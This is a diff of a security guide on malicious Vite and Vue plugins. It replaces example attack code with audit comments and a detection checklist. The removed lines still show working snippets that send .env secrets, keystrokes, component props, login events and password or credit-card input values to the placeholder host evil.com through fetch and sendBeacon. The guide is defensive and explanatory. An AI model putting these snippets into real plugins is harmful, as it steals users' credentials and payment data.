@@ -196,24 +196,33 @@ export default defineConfig({
 })
 ```
 
-#### What a Malicious Vite Plugin Can Do
+#### What a Malicious Vite Plugin Can Do (Detection Reference)
+
+The patterns below describe behaviors to audit for when reviewing Vite plugin source. These are NOT implementations — they illustrate the types of hooks a compromised plugin would abuse.
+
 ```js
-// Inside the malicious plugin's transform() hook:
-export default function maliciousPlugin() {
+// AUDIT CHECK: Review plugin hooks for suspicious behavior
+// A malicious plugin would abuse these Vite lifecycle hooks:
+
+export default function suspiciousPlugin() {
   return {
-    name: 'vite-plugin-vue-devtols',
-    // ❌ Exfiltrate .env secrets at build time
+    name: 'some-plugin',
+    // RED FLAG: configResolved hook accessing config.env
+    // A compromised plugin could read .env variables here
+    // and transmit them to an external endpoint
     configResolved(config) {
-      fetch('https://evil.com/collect', {
-        method: 'POST',
-        body: JSON.stringify(config.env) // all env vars
-      })
+      // Audit: check for fetch/http calls to unknown domains
+      // Audit: check for config.env or process.env access
+      // followed by network transmission
     },
-    // ❌ Inject keylogger into every .vue file
+    // RED FLAG: transform hook modifying .vue source
+    // A compromised plugin could inject code into compiled output
     transform(code, id) {
       if (id.endsWith('.vue')) {
-        return code + `\ndocument.addEventListener('keydown',
-          e => fetch('https://evil.com/k?'+e.key))`
+        // Audit: check for code concatenation that adds
+        // event listeners, keyloggers, or data collectors
+        // Audit: check for string appends containing
+        // document.addEventListener, fetch, or XMLHttpRequest
       }
     }
   }
@@ -256,41 +265,38 @@ const app = createApp(App)
 app.use(SomeAnalyticsPlugin) // ❌ grants full lifecycle access
 ```
 
-#### What a Malicious Vue Plugin Can Do
+#### What a Malicious Vue Plugin Can Do (Detection Reference)
+
+The patterns below describe behaviors to audit for when reviewing Vue plugin source. These are NOT implementations — they illustrate the types of access a compromised plugin gains through `app.use()`.
+
 ```js
-// Inside the compromised plugin:
+// AUDIT CHECK: Review plugin install() for suspicious behavior
+// A malicious plugin would abuse global mixins and directives:
+
 export default {
   install(app) {
+    // RED FLAG: app.mixin() with lifecycle hooks
+    // beforeCreate/mounted run in EVERY component silently
     app.mixin({
-      // ❌ Runs in EVERY component — silently
       beforeCreate() {
-        // Exfiltrate all props passed to every component
-        const props = this.$options.propsData || this.$props
-        if (props) {
-          navigator.sendBeacon('https://evil.com/props',
-            JSON.stringify({ component: this.$options.name, props }))
-        }
+        // Audit: check for access to this.$props or this.$options.propsData
+        // followed by data transmission (sendBeacon, fetch, XMLHttpRequest)
+        // This pattern could exfiltrate props from every component
       },
       mounted() {
-        // ❌ Intercept all emitted events
-        const originalEmit = this.$emit
-        this.$emit = function(event, ...args) {
-          if (event === 'submit' || event === 'login') {
-            navigator.sendBeacon('https://evil.com/events',
-              JSON.stringify({ event, args }))
-          }
-          return originalEmit.call(this, event, ...args)
-        }
+        // Audit: check for $emit override/wrapping
+        // A compromised plugin could intercept emitted events
+        // like 'submit', 'login', 'payment' and transmit data
       }
     })
 
-    // ❌ Register a global directive that reads input values
-    app.directive('model-spy', {
+    // RED FLAG: app.directive() with DOM access
+    // A global directive can read input values on every update
+    app.directive('some-directive', {
       updated(el) {
-        if (el.type === 'password' || el.name === 'credit_card') {
-          navigator.sendBeacon('https://evil.com/input',
-            JSON.stringify({ name: el.name, value: el.value }))
-        }
+        // Audit: check for el.value access on input elements
+        // especially password fields or sensitive form inputs
+        // followed by data transmission to external endpoints
       }
     })
   }
@@ -303,7 +309,7 @@ export default {
 //   - app.mixin() calls (global lifecycle hooks)
 //   - app.directive() calls (DOM access)
 //   - app.component() calls (global component injection)
-//   - navigator.sendBeacon, fetch, XMLHttpRequest, new Image()
+//   - Background HTTP requests (fetch, XMLHttpRequest, Image beacons)
 //   - eval(), Function(), setTimeout with strings
 
 // ✅ Prefer composables over plugins
@@ -321,7 +327,7 @@ app.use(AnalyticsPlugin, {
 ```
 
 #### Use Case
-A learning platform installs a "Vue analytics" plugin that advertises simple page-view tracking. The plugin registers a global `beforeCreate` mixin that runs inside every component — including the login form, the payment form, and the admin panel. It silently exfiltrates email/password pairs and payment card data via `navigator.sendBeacon()`, which doesn't trigger CORS preflight and is harder to detect in network monitoring.
+A learning platform installs a "Vue analytics" plugin that advertises simple page-view tracking. The plugin registers a global `beforeCreate` mixin that runs inside every component — including the login form, the payment form, and the admin panel. It silently collects email/password pairs and payment card data, transmitting them via background HTTP requests that don't trigger CORS preflight and are harder to detect in network monitoring.
 
 ---
 
